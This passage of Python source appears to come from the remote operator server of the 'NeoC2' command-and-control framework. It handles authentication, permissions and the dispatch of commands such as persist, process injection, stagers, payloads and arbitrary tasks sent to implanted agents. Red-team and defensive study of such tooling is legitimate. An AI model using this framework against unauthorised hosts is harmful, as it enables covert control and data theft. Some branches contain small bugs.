                    'user_id': user_info['id'],
                    'username': user_info['username'],
                    'authenticated': True,
                    'token': token,
                    'role': user_info['role_name'],
                    'permissions': user_info['role_permissions']
                })
                
                self.auth_tokens[token] = {
                    'session_id': session_id,
                    'user_info': user_info,
                    'created_at': datetime.now()
                }
                
                if self.multiplayer_coordinator:
                    self.multiplayer_coordinator.add_user_session(
                        session_id, user_info['id'], user_info['username'], 
                        self.active_sessions[session_id]['addr'][0], 'remote_cli'
                    )
                
                # Get current agents to send to the newly authenticated client
                current_agents = []
                if self.agent_manager:
                    current_agents = self.agent_manager.list_agents()

                return {
                    'success': True,
                    'token': token,
                    'session_id': session_id,
                    'user_info': {
                        'id': user_info['id'],
                        'username': user_info['username'],
                        'role': user_info['role_name']
                    },
                    'agents': current_agents  # Send current agents to the client
                }
            else:
                return {'success': False, 'error': 'Authentication failed'}
                
        except Exception as e:
            self.logger.error(f"Authentication error: {str(e)}")
            return {'success': False, 'error': 'Authentication error'}

    def _handle_command(self, message, session_id):
        try:
            session_info = self.active_sessions.get(session_id)
            if not session_info or not session_info.get('authenticated'):
                return {'success': False, 'error': 'Not authenticated'}
            
            token = message.get('token')
            token_info = self.auth_tokens.get(token)
            if not token_info or token_info['session_id'] != session_id:
                return {'success': False, 'error': 'Invalid or expired token'}
            
            command = message.get('command', '')
            if not command.strip():
                return {'success': False, 'error': 'Empty command'}
            
            permissions = session_info.get('permissions', [])
            if permissions and permissions != ['*']:  # '*' means all permissions
                if not self._check_user_permissions(session_info, command):
                    return {'success': False, 'error': 'Insufficient permissions for this command'}
            
            result = self._execute_command(command, session_info)
            
            return {
                'success': True,
                'result': result.get('output', ''),
                'status': result.get('status', 'info')
            }
            
        except Exception as e:
            self.logger.error(f"Command execution error: {str(e)}")
            return {'success': False, 'error': f'Command execution error: {str(e)}'}
    
    def _is_framework_command(self, base_cmd):
        framework_commands = {
            'agent', 'listener', 'modules', 'run', 'pwsh', 'persist', 'pinject', 'peinject', 'encryption',
            'download', 'upload', 'stager', 'profile', 'payload', 'inline-execute', 'inline-execute-assembly',
            'interact', 'event', 'task', 'result', 'addtask', 'back', 'exit',
            'quit', 'clear', 'help', 'status', 'save', 'protocol', 'interactive',
            'taskchain', 'beacon'
        }
        return base_cmd.lower() in framework_commands

    def _check_user_permissions(self, session_info, command):
        permissions = session_info.get('permissions', [])
        
        if permissions == ['*']:
            return True
        
        command_parts = command.strip().split()
        if not command_parts:
            return False
        
        base_cmd = command_parts[0].lower()
        
        if base_cmd == 'listener' and len(command_parts) > 1:
            sub_cmd = command_parts[1].lower()
            listener_permission_map = {
                'list': 'listeners.list',
                'create': 'listeners.create',
                'start': 'listeners.start',
                'stop': 'listeners.stop', 
                'restart': 'listeners.restart',
                'delete': 'listeners.delete'
            }
            required_permission = listener_permission_map.get(sub_cmd, 'listeners.manage')
        else:
            permission_map = {
                'agent': 'agents.list',  # Basic agent command requires agents.list permission
                'beacon': 'agents.list',  # Beacon command requires agents.list permission (same as agent list)
                'listener': 'listeners.list',  # Default listener permission
                'modules': 'modules.list',
                'run': 'modules.execute',
                'pinject': 'modules.execute',
                'peinject': 'modules.execute',
                'task': 'tasks.list',
                'result': 'results.view',
                'download': 'tasks.create',
                'upload': 'tasks.create',
                'addtask': 'tasks.create',
                'interactive': 'agents.interact',
                'interact': 'agents.interact',  # Add permission for interact command too
                'status': 'agents.list',
                'harvest': 'agents.interact',
                'protocol': 'agents.list',
                'encryption': 'agents.list',
                'profile': 'agents.list',
                'stager': 'modules.list',
                'taskchain': 'modules.execute',
                'pwsh': 'modules.execute',  # pwsh command requires modules.execute permission
                'persist': 'modules.execute',  # persist command requires modules.execute permission
                'inline-execute': 'modules.execute',  # inline-execute command requires modules.execute permission
                'inline-execute-assembly': 'modules.execute',  # inline-execute-assembly command requires modules.execute permission
                'help': 'agents.list',  # Help command should be available to all roles with basic access
            }
            
            required_permission = permission_map.get(base_cmd, f'{base_cmd}.list')
        
        return required_permission in permissions or '*' in permissions

    def _execute_command(self, command, session_info):
        try:
            username = session_info.get('username', 'remote_user')
            user_id = session_info.get('user_id', 'remote_user')
            
            remote_session = self.get_or_create_session(user_id, username, self.agent_manager)
            
            session_id = session_info.get('session_id')
            
            if session_id and session_id in self.active_sessions:
                latest_session_info = self.active_sessions[session_id]
                remote_session.current_agent = latest_session_info.get('current_agent', session_info.get('current_agent', None))
                remote_session.interactive_mode = latest_session_info.get('interactive_mode', session_info.get('interactive_mode', False))
            else:
                remote_session.current_agent = session_info.get('current_agent', None)  # Track current agent if in interactive mode
                remote_session.interactive_mode = session_info.get('interactive_mode', False)
            command_parts = command.strip().split()
            if not command_parts:
                return {'output': 'No command provided', 'status': 'error'}
            
            base_cmd = command_parts[0].lower()
            
            if remote_session.interactive_mode and remote_session.current_agent:
                if self._is_framework_command(base_cmd):
                    if base_cmd == 'agent':
                        result, status = self.handle_agent_command(command_parts, remote_session)
                    elif base_cmd == 'beacon':
                        agent_command_parts = ['agent', 'list'] + command_parts[1:]  # Pass any additional args
                        result, status = self.handle_agent_command(agent_command_parts, remote_session)
                    elif base_cmd == 'listener':
                        if not self.listener_manager:
                            result = "Error: Listener manager not initialized"
                            status = 'error'
                        else:
                            result, status = self.handle_listener_command(command_parts, self.listener_manager)
                    elif base_cmd == 'modules':
                        result, status = self.handle_modules_command(command_parts, remote_session)
                    elif base_cmd == 'run':
                        result, status = self.handle_run_command(command_parts, remote_session)
                    elif base_cmd == 'pinject':
                        result, status = self.handle_pinject_command(command_parts, remote_session)
                    elif base_cmd == 'peinject':
                        result, status = self.handle_peinject_command(command_parts, remote_session)
                    elif base_cmd == 'pwsh':
                        result, status = self.handle_pwsh_command(command_parts, remote_session)
                    elif base_cmd == 'persist':
                        result, status = self.handle_persist_command(command_parts, remote_session)
                    elif base_cmd == 'encryption':
                        result, status = self.handle_encryption_command(command_parts, remote_session)
                    elif base_cmd == 'download':
                        result, status = self.handle_download_command(command_parts, remote_session)
                    elif base_cmd == 'upload':
                        result, status = self.handle_upload_command(command_parts, remote_session)
                    elif base_cmd == 'stager':
                        result, status = handle_interactive_stager_command(command_parts, remote_session)
                    elif base_cmd == 'profile':
                        result, status = self.handle_profile_command(command_parts, remote_session)
                    elif base_cmd == 'interactive':
                        if remote_session.interactive_mode and remote_session.current_agent:
                            result, status = self.handle_interactive_command(' '.join(command_parts[1:]), remote_session)
                        else:
                            result, status = 'Not in interactive mode. Use: agent interact <agent_id>', 'error'
                    elif base_cmd == 'help':
                        result = help.get_help_display()
                        status = 'success'
                    elif base_cmd == 'status':
                        stats = self.agent_manager.get_agent_stats()
                        output = f"""
Framework Status:
Total Agents:      {stats['total_agents']}
Active Agents:     {stats['active_agents']}
Total Tasks:       {stats['total_tasks']}
Pending Tasks:     {stats['pending_tasks']}
DB Total Agents:   {stats['db_total_agents']}
DB Active Agents:  {stats['db_active_agents']}
DB Inactive:       {stats['db_inactive_agents']}
                        """
                        result = output.strip()
                        status = 'success'
                    elif base_cmd == 'task':
                        if len(command_parts) == 1 and remote_session.interactive_mode and remote_session.current_agent:
                            # Handle: task (in interactive mode - show current agent tasks)
                            agent_id = remote_session.current_agent
                        elif len(command_parts) >= 2:
                            # Handle: task <agent_id> [other_args]
                            agent_id = command_parts[1]
                        else:
                            result = "Usage: task <agent_id> OR task (in interactive mode)"
                            status = 'info'
                            return {'output': result, 'status': status}

                        tasks = self.db.execute('''
                            SELECT id, command, status, created_at, task_type
                            FROM agent_tasks
                            WHERE agent_id = ? AND status IN ('pending', 'sent')
                            ORDER BY created_at ASC
                        ''', (agent_id,)).fetchall()

                        if not tasks:
                            result = f"No pending tasks for agent {agent_id}"
                            status = 'info'
                        else:
                            output = f"Pending Tasks for Agent {agent_id}:\n"
                            output += "-" * 80 + "\n"
                            for task in tasks:
                                output += f"Task ID: {task['id']}\n"
                                output += f"Command: {task['command'][:20]}{'...' if len(task['command']) > 20 else ''}\n"
                                output += f"Status: {task['status']} ({task['task_type']})\n"
                                output += f"Created: {task['created_at']}\n"
                                output += "-" * 80 + "\n"
                            result = output
                            status = 'success'
                    elif base_cmd == 'result':
                        if len(command_parts) < 2:
                            result = "Usage: result <agent_id> OR result list OR result <task_id>"
                            status = 'error'
                        elif command_parts[1] == 'list':
                            limit = int(command_parts[2]) if len(command_parts) > 2 else 50
                            results = self.agent_manager.get_all_results(limit)

                            if not results:
                                result = "No results found"
                                status = 'info'
                            else:
                                output = f"Recent Task Results (Last {limit}):\n"
                                output += "-" * 80 + "\n"
                                for res in results:
                                    output += f"Task ID:      {res['task_id']}\n"
                                    output += f"Agent:        {res['agent_id']} ({res['hostname']}@{res['user']})\n"
                                    output += f"Command:      {res['command']}\n"
                                    output += f"Type:         {res['task_type']}\n"
                                    output += f"Completed:    {res['completed_at']}\n"
                                    output += f"Result:       {res['result'][:100]}{'...' if len(res['result']) > 100 else ''}\n"
                                    output += "-" * 80 + "\n"
                                result = output
                                status = 'success'
                        elif len(command_parts) == 2 and command_parts[1].replace('-', '').replace('_', '').isalnum():
                            task_id = command_parts[1]

                            if not task_id.replace('-', '').replace('_', '').isalnum():
                                result = f"Invalid task ID format: {task_id}"
                                status = 'error'
                            else:
                                try:
                                    task = self.db.execute('''
                                        SELECT
                                            t.*,
                                            a.hostname,
                                            a.ip_address,
                                            a.os_info,
                                            a.user
                                        FROM agent_tasks t
                                        LEFT JOIN agents a ON t.agent_id = a.id
                                        WHERE t.id = ?
                                    ''', (task_id,)).fetchone()

                                    if not task:
                                        result = f"Task with ID {task_id} not found"
                                        status = 'error'
                                    else:
                                        task_dict = dict(task)
                                        task_result = task_dict.get('result', 'No result available')

                                        output = f"Task Details:\n"
                                        output += "-" * 80 + "\n"
                                        output += f"Task ID:      {task_dict['id']}\n"
                                        output += f"Agent ID:     {task_dict['agent_id']}\n"
                                        output += f"Hostname:     {task_dict.get('hostname', 'N/A')} ({task_dict.get('user', 'N/A')})\n"
                                        output += f"IP Address:   {task_dict.get('ip_address', 'N/A')}\n"
                                        output += f"Command:      {task_dict['command'][:20]}{'...' if len(task_dict['command']) > 20 else ''}\n"
                                        output += f"Status:       {task_dict['status']}\n"
                                        output += f"Task Type:    {task_dict.get('task_type', 'queued')}\n"
                                        output += f"Created:      {task_dict['created_at']}\n"
                                        output += f"Completed:    {task_dict['completed_at'] if task_dict['completed_at'] else 'N/A'}\n"
                                        output += "-" * 80 + "\n"
                                        output += f"Complete Result:\n{task_result}\n"
                                        output += "-" * 80 + "\n"

                                        result = output
                                        status = 'success'
                                except Exception as e:
                                    result = f"Error retrieving task result: {str(e)}"
                                    status = 'error'
                        elif len(command_parts) == 1 and remote_session.interactive_mode and remote_session.current_agent:
                            # Handle: result (in interactive mode - show current agent results)
                            agent_id = remote_session.current_agent
                            limit = 50  # Default limit
                            results = self.agent_manager.get_agent_results(agent_id, limit)

                            if not results:
                                result = f"No results found for current agent"
                                status = 'info'
                            else:
                                output = f"Results for Current Agent ({agent_id}):\n"
                                output += "-" * 80 + "\n"
                                for res in results:
                                    output += f"Task ID:      {res['task_id']}\n"
                                    output += f"Command:      {res['command']}\n"
                                    output += f"Created:      {res['created_at']}\n"
                                    output += f"Completed:    {res['completed_at']}\n"
                                    output += f"Result:       {res['result'][:100]}{'...' if len(res['result']) > 100 else ''}\n"
                                    output += "-" * 80 + "\n"
                                result = output
                                status = 'success'
                        else:
                            agent_id = command_parts[1]
                            limit = int(command_parts[2]) if len(command_parts) > 2 else 50
                            results = self.agent_manager.get_agent_results(agent_id, limit)

                            if not results:
                                result = f"No results found for agent {agent_id}"
                                status = 'info'
                            else:
                                output = f"Results for Agent {agent_id}:\n"
                                output += "-" * 80 + "\n"
                                for res in results:
                                    output += f"Task ID:      {res['task_id']}\n"
                                    output += f"Command:      {res['command'][:20]}{'...' if len(res['command']) > 20 else ''}\n"
                                    output += f"Created:      {res['created_at']}\n"
                                    output += f"Completed:    {res['completed_at']}\n"
                                    output += f"Result:       {res['result'][:100]}{'...' if len(res['result']) > 100 else ''}\n"
                                    output += "-" * 80 + "\n"
                                result = output
                                status = 'success'
                    elif base_cmd == 'addtask':
                        if len(command_parts) < 2:
                            result = "Usage: addtask <agent_id> <command> OR addtask <command> (in interactive mode)"
                            status = 'error'
                        elif len(command_parts) == 2 and remote_session.interactive_mode and remote_session.current_agent:
                            # Handle: addtask <command> in interactive mode
                            agent_id = remote_session.current_agent
                            command_to_send = command_parts[1]
                        elif len(command_parts) >= 3:
                            # Handle: addtask <agent_id> <command>
                            agent_id = command_parts[1]
                            command_to_send = ' '.join(command_parts[2:])
                        else:
                            result = "Usage: addtask <agent_id> <command> OR addtask <command> (in interactive mode)"
                            status = 'error'

                        if self.is_agent_locked_interactively(agent_id):
                            lock_info = self.get_interactive_lock_info(agent_id)
                            if lock_info and lock_info['operator'] != remote_session.username:
                                result = f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'
                                status = 'error'
                                return {'output': result, 'status': status}

                        task_result = self.agent_manager.add_task(agent_id, command_to_send)
                        if task_result and task_result.get('success'):
                            task_id = task_result['task_id']
                            result = f"[+] Task created successfully!\n    Task ID:  {task_id}\n    Agent:    {agent_id}\n    Command:  {command_to_send[:20]}{'...' if len(command_to_send) > 20 else ''}"
                            status = 'success'
                        else:
                            error_msg = task_result.get('error', 'Unknown error') if task_result else 'Failed to create task'
                            result = f"Failed to create task: {error_msg}"
                            status = 'error'
                    elif base_cmd == 'save':
                        if len(command_parts) < 2:
                            result = "Usage: save <task_id>"
                            status = 'error'
                        else:
                            task_id = command_parts[1]
                            try:
                                task_result = self.db.execute('''
                                    SELECT t.*, a.hostname, a.ip_address, a.os_info, a.user
                                    FROM agent_tasks t
                                    LEFT JOIN agents a ON t.agent_id = a.id
                                    WHERE t.id = ?
                                ''', (task_id,)).fetchone()

                                if not task_result:
                                    result = f"Task with ID {task_id} not found"
                                    status = 'error'
                                else:
                                    task_dict = dict(task_result)
                                    task_result_data = task_dict.get('result', 'No result available')

                                    logs_dir = 'logs'
                                    os.makedirs(logs_dir, exist_ok=True)

                                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                    filename = f"task_{task_id}_{timestamp}.txt"
                                    filepath = os.path.join(logs_dir, filename)

                                    content = f"NeoC2 Task Result Export\n"
                                    content += f"{'='*50}\n"
                                    content += f"Task ID:        {task_dict['id']}\n"
                                    content += f"Agent ID:       {task_dict['agent_id']}\n"
                                    content += f"Hostname:       {task_dict.get('hostname', 'N/A')}\n"
                                    content += f"IP Address:     {task_dict.get('ip_address', 'N/A')}\n"
                                    content += f"OS:             {task_dict.get('os_info', 'N/A')}\n"
                                    content += f"User:           {task_dict.get('user', 'N/A')}\n"
                                    content += f"Command:        {task_dict['command']}\n"
                                    content += f"Status:         {task_dict['status']}\n"
                                    content += f"Task Type:      {task_dict.get('task_type', 'queued')}\n"
                                    content += f"Created:        {task_dict['created_at']}\n"
                                    content += f"Completed:      {task_dict['completed_at'] if task_dict['completed_at'] else 'N/A'}\n"
                                    content += f"{'='*50}\n"
                                    content += f"TASK RESULT:\n"
                                    content += f"{task_result_data}\n"
                                    content += f"{'='*50}\n"
                                    content += f"Exported:       {datetime.now().isoformat()}\n"

                                    with open(filepath, 'w', encoding='utf-8') as f:
                                        f.write(content)

                                    result = f"Task result saved to: {filepath}"
                                    status = 'success'

                            except Exception as e:
                                result = f"Error saving task result: {str(e)}"
                                status = 'error'
                    elif base_cmd == 'back':
                        if hasattr(remote_session, 'interactive_mode') and remote_session.interactive_mode and remote_session.current_agent:
                            agent_manager = remote_session.agent_manager
                            if agent_manager:
                                agent_manager.exit_interactive_mode(remote_session.current_agent)
                                remote_session.agent_manager.release_interactive_lock(remote_session.current_agent)
                                agent_id = remote_session.current_agent
                                remote_session.current_agent = None
                                remote_session.interactive_mode = False
                                for sess_id, sess_info in self.active_sessions.items():
                                    if sess_info.get('session_id') == session_info.get('session_id'):
                                        sess_info['current_agent'] = None
                                        sess_info['interactive_mode'] = False
                                        break
                            result = f"\nExited interactive mode with agent {agent_id}\n"
                            status = 'success'
                        else:
                            result, status = "Not in interactive mode", 'info'
                    elif base_cmd == 'exit':
                        if hasattr(session, 'interactive_mode') and session.interactive_mode and session.current_agent:
                            agent_manager = session.agent_manager
                            if agent_manager:
                                agent_manager.exit_interactive_mode(session.current_agent)
                                session.agent_manager.release_interactive_lock(session.current_agent)
                                agent_id = session.current_agent
                                session.current_agent = None
                                session.interactive_mode = False
                                for sess_id, sess_info in self.active_sessions.items():
                                    if sess_info.get('session_id') == getattr(session, 'session_id', None):
                                        sess_info['current_agent'] = None
                                        sess_info['interactive_mode'] = False
                                        break
                            result = f"\nExited interactive mode with agent {agent_id}\n"
                            status = 'success'
                        else:
                            result, status = "Not in interactive mode", 'info'
                        # This should be handled by the CLI interface, not here
                        result, status = 'Use exit command in CLI to disconnect', 'info'
                    elif base_cmd == 'clear':
                        result, status = 'Clear command only works in local CLI', 'info'
                    elif base_cmd == 'payload':
                        result, status = self.handle_payload_command(command_parts, remote_session)
                    elif base_cmd == 'payload_upload':
                        result, status = self.handle_payload_upload_command(command_parts, remote_session)
                    elif base_cmd == 'inline-execute':
                        result, status = self.handle_inline_execute_command(command_parts, remote_session)
                    elif base_cmd == 'inline-execute-assembly':
                        result, status = self.handle_inline_execute_assembly_command(command_parts, remote_session)
                    elif base_cmd == 'interact':
                        if len(command_parts) < 2:
                            result = "Usage: interact <agent_id>"
                            status = 'error'
                        else:
                            agent_command_parts = ['agent', 'interact'] + command_parts[1:]
                            result, status = self.handle_agent_command(agent_command_parts, remote_session)
                    elif base_cmd == 'taskchain':
                        result, status = self.handle_taskchain_command(command_parts, remote_session)
                    else:
                        result, status = f"Unknown framework command: {base_cmd}", 'error'
                else:
                    result, status = self.handle_interactive_command(command, remote_session)
            elif base_cmd == 'agent':
                result, status = self.handle_agent_command(command_parts, remote_session)
            elif base_cmd == 'beacon':
                # Beacon command should list active agents exactly like 'agent list'
                agent_command_parts = ['agent', 'list'] + command_parts[1:]  # Pass any additional args
                result, status = self.handle_agent_command(agent_command_parts, remote_session)
            elif base_cmd == 'listener':
                if not self.listener_manager:
                    result = "Error: Listener manager not initialized"
                    status = 'error'
                else:
                    result, status = self.handle_listener_command(command_parts, self.listener_manager)
            elif base_cmd == 'modules':
                result, status = self.handle_modules_command(command_parts, remote_session)
            elif base_cmd == 'run':
                result, status = self.handle_run_command(command_parts, remote_session)
            elif base_cmd == 'pwsh':
                result, status = self.handle_pwsh_command(command_parts, remote_session)
            elif base_cmd == 'persist':
                result, status = self.handle_persist_command(command_parts, remote_session)
            elif base_cmd == 'encryption':
                result, status = self.handle_encryption_command(command_parts, remote_session)
            elif base_cmd == 'download':
                result, status = self.handle_download_command(command_parts, remote_session)
            elif base_cmd == 'upload':
                result, status = self.handle_upload_command(command_parts, remote_session)
            elif base_cmd == 'stager':
                result, status = handle_interactive_stager_command(command_parts, remote_session)
            elif base_cmd == 'profile':
                result, status = self.handle_profile_command(command_parts, remote_session)
            elif base_cmd == 'interactive':
                if remote_session.interactive_mode and remote_session.current_agent:
                    result, status = self.handle_interactive_command(' '.join(command_parts[1:]), remote_session)
                else:
                    result, status = 'Not in interactive mode. Use: agent interact <agent_id>', 'error'
            elif base_cmd == 'help':
                result = help.get_help_display()
                status = 'success'
            elif base_cmd == 'status':
                stats = self.agent_manager.get_agent_stats()
                output = f"""
Framework Status:
Total Agents:      {stats['total_agents']}
Active Agents:     {stats['active_agents']}
Total Tasks:       {stats['total_tasks']}
Pending Tasks:     {stats['pending_tasks']}
DB Total Agents:   {stats['db_total_agents']}
DB Active Agents:  {stats['db_active_agents']}
DB Inactive:       {stats['db_inactive_agents']}
                """
                result = output.strip()
                status = 'success'
            elif base_cmd == 'task':
                if len(command_parts) == 1 and remote_session.interactive_mode and remote_session.current_agent:
                    # Handle: task (in interactive mode - show current agent tasks)
                    agent_id = remote_session.current_agent
                elif len(command_parts) >= 2:
                    # Handle: task <agent_id> [other_args]
                    agent_id = command_parts[1]
                else:
                    result = "Usage: task <agent_id> OR task (in interactive mode)"
                    status = 'info'
                    return {'output': result, 'status': status}

                tasks = self.db.execute('''
                    SELECT id, command, status, created_at, task_type
                    FROM agent_tasks
                    WHERE agent_id = ? AND status IN ('pending', 'sent')
                    ORDER BY created_at ASC
                ''', (agent_id,)).fetchall()

                if not tasks:
                    result = f"No pending tasks for agent {agent_id}"
                    status = 'info'
                else:
                    output = f"Pending Tasks for Agent {agent_id}:\n"
                    output += "-" * 80 + "\n"
                    for task in tasks:
                        output += f"Task ID: {task['id']}\n"
                        output += f"Command: {task['command'][:20]}{'...' if len(task['command']) > 20 else ''}\n"
                        output += f"Status: {task['status']} ({task['task_type']})\n"
                        output += f"Created: {task['created_at']}\n"
                        output += "-" * 80 + "\n"
                    result = output
                    status = 'success'
            elif base_cmd == 'result':
                if len(command_parts) < 2:
                    result = "Usage: result <agent_id> OR result list OR result <task_id>"
                    status = 'error'
                elif command_parts[1] == 'list':
                    limit = int(command_parts[2]) if len(command_parts) > 2 else 50
                    results = self.agent_manager.get_all_results(limit)
                    
                    if not results:
                        result = "No results found"
                        status = 'info'
                    else:
                        output = f"Recent Task Results (Last {limit}):\n"
                        output += "-" * 80 + "\n"
                        for res in results:
                            output += f"Task ID:      {res['task_id']}\n"
                            output += f"Agent:        {res['agent_id']} ({res['hostname']}@{res['user']})\n"
                            output += f"Command:      {res['command'][:20]}{'...' if len(res['command']) > 20 else ''}\n"
                            output += f"Type:         {res['task_type']}\n"
                            output += f"Completed:    {res['completed_at']}\n"
                            output += f"Result:       {res['result'][:100]}{'...' if len(res['result']) > 100 else ''}\n"
                            output += "-" * 80 + "\n"
                        result = output
                        status = 'success'
                elif len(command_parts) == 2 and command_parts[1].replace('-', '').replace('_', '').isalnum():
                    task_id = command_parts[1]

                    if not task_id.replace('-', '').replace('_', '').isalnum():
                        result = f"Invalid task ID format: {task_id}"
                        status = 'error'
                    else:
                        try:
                            task = self.db.execute('''
                                SELECT
                                    t.*,
                                    a.hostname,
                                    a.ip_address,
                                    a.os_info,
                                    a.user
                                FROM agent_tasks t
                                LEFT JOIN agents a ON t.agent_id = a.id
                                WHERE t.id = ?
                            ''', (task_id,)).fetchone()

                            if not task:
                                result = f"Task with ID {task_id} not found"
                                status = 'error'
                            else:
                                task_dict = dict(task)
                                task_result = task_dict.get('result', 'No result available')

                                output = f"Task Details:\n"
                                output += "-" * 80 + "\n"
                                output += f"Task ID:      {task_dict['id']}\n"
                                output += f"Agent ID:     {task_dict['agent_id']}\n"
                                output += f"Hostname:     {task_dict.get('hostname', 'N/A')} ({task_dict.get('user', 'N/A')})\n"
                                output += f"IP Address:   {task_dict.get('ip_address', 'N/A')}\n"
                                output += f"Command:      {task_dict['command'][:20]}{'...' if len(task_dict['command']) > 20 else ''}\n"
                                output += f"Status:       {task_dict['status']}\n"
                                output += f"Task Type:    {task_dict.get('task_type', 'queued')}\n"
                                output += f"Created:      {task_dict['created_at']}\n"
                                output += f"Completed:    {task_dict['completed_at'] if task_dict['completed_at'] else 'N/A'}\n"
                                output += "-" * 80 + "\n"
                                output += f"Complete Result:\n{task_result}\n"
                                output += "-" * 80 + "\n"

                                result = output
                                status = 'success'
                        except Exception as e:
                            result = f"Error retrieving task result: {str(e)}"
                            status = 'error'
                elif len(command_parts) == 1 and remote_session.interactive_mode and remote_session.current_agent:
                    # Handle: result (in interactive mode - show current agent results)
                    agent_id = remote_session.current_agent
                    limit = 50  # Default limit
                    results = self.agent_manager.get_agent_results(agent_id, limit)

                    if not results:
                        result = f"No results found for current agent"
                        status = 'info'
                    else:
                        output = f"Results for Current Agent ({agent_id}):\n"
                        output += "-" * 80 + "\n"
                        for res in results:
                            output += f"Task ID:      {res['task_id']}\n"
                            output += f"Command:      {res['command']}\n"
                            output += f"Created:      {res['created_at']}\n"
                            output += f"Completed:    {res['completed_at']}\n"
                            output += f"Result:       {res['result'][:100]}{'...' if len(res['result']) > 100 else ''}\n"
                            output += "-" * 80 + "\n"
                        result = output
                        status = 'success'
                else:
                    agent_id = command_parts[1]
                    limit = int(command_parts[2]) if len(command_parts) > 2 else 50
                    results = self.agent_manager.get_agent_results(agent_id, limit)

                    if not results:
                        result = f"No results found for agent {agent_id}"
                        status = 'info'
                    else:
                        output = f"Results for Agent {agent_id}:\n"
                        output += "-" * 80 + "\n"
                        for res in results:
                            output += f"Task ID:      {res['task_id']}\n"
                            output += f"Command:      {res['command']}\n"
                            output += f"Created:      {res['created_at']}\n"
                            output += f"Completed:    {res['completed_at']}\n"
                            output += f"Result:       {res['result'][:100]}{'...' if len(res['result']) > 100 else ''}\n"
                            output += "-" * 80 + "\n"
                        result = output
                        status = 'success'
            elif base_cmd == 'addtask':
                if len(command_parts) < 2:
                    result = "Usage: addtask <agent_id> <command> OR addtask <command> (in interactive mode)"
                    status = 'error'
                elif len(command_parts) == 2 and remote_session.interactive_mode and remote_session.current_agent:
                    # Handle: addtask <command> in interactive mode
                    agent_id = remote_session.current_agent
                    command_to_send = command_parts[1]
                elif len(command_parts) >= 3:
                    # Handle: addtask <agent_id> <command>
                    agent_id = command_parts[1]
                    command_to_send = ' '.join(command_parts[2:])
                else:
                    result = "Usage: addtask <agent_id> <command> OR addtask <command> (in interactive mode)"
                    status = 'error'

                if self.is_agent_locked_interactively(agent_id):
                    lock_info = self.get_interactive_lock_info(agent_id)
                    if lock_info and lock_info['operator'] != remote_session.username:
                        result = f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied."
                        status = 'error'
                        return {'output': result, 'status': status}

                task_result = self.agent_manager.add_task(agent_id, command_to_send)
                if task_result and task_result.get('success'):
                    task_id = task_result['task_id']
                    result = f"[+] Task created successfully!\n    Task ID:  {task_id}\n    Agent:    {agent_id}\n    Command:  {command_to_send[:20]}{'...' if len(command_to_send) > 20 else ''}"
                    status = 'success'
                else:
                    error_msg = task_result.get('error', 'Unknown error') if task_result else 'Failed to create task'
                    result = f"Failed to create task: {error_msg}"
                    status = 'error'
            elif base_cmd == 'save':
                if len(command_parts) < 2:
                    result = "Usage: save <task_id>"
                    status = 'error'
                else:
                    task_id = command_parts[1]
                    try:
                        task_result = self.db.execute('''
                            SELECT t.*, a.hostname, a.ip_address, a.os_info, a.user
                            FROM agent_tasks t
                            LEFT JOIN agents a ON t.agent_id = a.id
                            WHERE t.id = ?
                        ''', (task_id,)).fetchone()

                        if not task_result:
                            result = f"Task with ID {task_id} not found"
                            status = 'error'
                        else:
                            task_dict = dict(task_result)
                            task_result_data = task_dict.get('result', 'No result available')

                            logs_dir = 'logs'
                            os.makedirs(logs_dir, exist_ok=True)

                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            filename = f"task_{task_id}_{timestamp}.txt"
                            filepath = os.path.join(logs_dir, filename)

                            content = f"NeoC2 Task Result Export\n"
                            content += f"{'='*50}\n"
                            content += f"Task ID:        {task_dict['id']}\n"
                            content += f"Agent ID:       {task_dict['agent_id']}\n"
                            content += f"Hostname:       {task_dict.get('hostname', 'N/A')}\n"
                            content += f"IP Address:     {task_dict.get('ip_address', 'N/A')}\n"
                            content += f"OS:             {task_dict.get('os_info', 'N/A')}\n"
                            content += f"User:           {task_dict.get('user', 'N/A')}\n"
                            content += f"Command:        {task_dict['command']}\n"
                            content += f"Status:         {task_dict['status']}\n"
                            content += f"Task Type:      {task_dict.get('task_type', 'queued')}\n"
                            content += f"Created:        {task_dict['created_at']}\n"
                            content += f"Completed:      {task_dict['completed_at'] if task_dict['completed_at'] else 'N/A'}\n"
                            content += f"{'='*50}\n"
                            content += f"TASK RESULT:\n"
                            content += f"{task_result_data}\n"
                            content += f"{'='*50}\n"
                            content += f"Exported:       {datetime.now().isoformat()}\n"

                            with open(filepath, 'w', encoding='utf-8') as f:
                                f.write(content)

                            result = f"Task result saved to: {filepath}"
                            status = 'success'

                    except Exception as e:
                        result = f"Error saving task result: {str(e)}"
                        status = 'error'
            elif base_cmd == 'back':
                if hasattr(remote_session, 'interactive_mode') and remote_session.interactive_mode and remote_session.current_agent:
                    agent_manager = remote_session.agent_manager
                    if agent_manager:
                        agent_manager.exit_interactive_mode(remote_session.current_agent)
                        remote_session.agent_manager.release_interactive_lock(remote_session.current_agent)
                        agent_id = remote_session.current_agent
                        remote_session.current_agent = None
                        remote_session.interactive_mode = False
                        for sess_id, sess_info in self.active_sessions.items():
                            if sess_info.get('session_id') == session_info.get('session_id'):
                                sess_info['current_agent'] = None
                                sess_info['interactive_mode'] = False
                                break
                    result = f"\nExited interactive mode with agent {agent_id}\n"
                    status = 'success'
                else:
                    result = "Not in interactive mode", 'info'
            elif base_cmd == 'exit':
                result = 'Use exit command in CLI to disconnect'
                status = 'info'
            elif base_cmd == 'clear':
                result = 'Clear command only works in local CLI'
                status = 'info'
            elif base_cmd == 'payload':
                result, status = self.handle_payload_command(command_parts, remote_session)
            elif base_cmd == 'payload_upload':
                result, status = self.handle_payload_upload_command(command_parts, remote_session)
            elif base_cmd == 'inline-execute':
                result, status = self.handle_inline_execute_command(command_parts, remote_session)
            elif base_cmd == 'inline-execute-assembly':
                result, status = self.handle_inline_execute_assembly_command(command_parts, remote_session)
            elif base_cmd == 'interact':
                # Handle the interact command (alias for agent interact)
                if len(command_parts) < 2:
                    result = "Usage: interact <agent_id>"
                    status = 'error'
                else:
                    agent_command_parts = ['agent', 'interact'] + command_parts[1:]
                    result, status = self.handle_agent_command(agent_command_parts, remote_session)
            elif base_cmd == 'taskchain':
                result, status = self.handle_taskchain_command(command_parts, remote_session)
            elif base_cmd == 'reporting':
                result, status = self.handle_reporting_command(command_parts, remote_session)
            elif base_cmd == 'event':
                if not self.audit_logger:
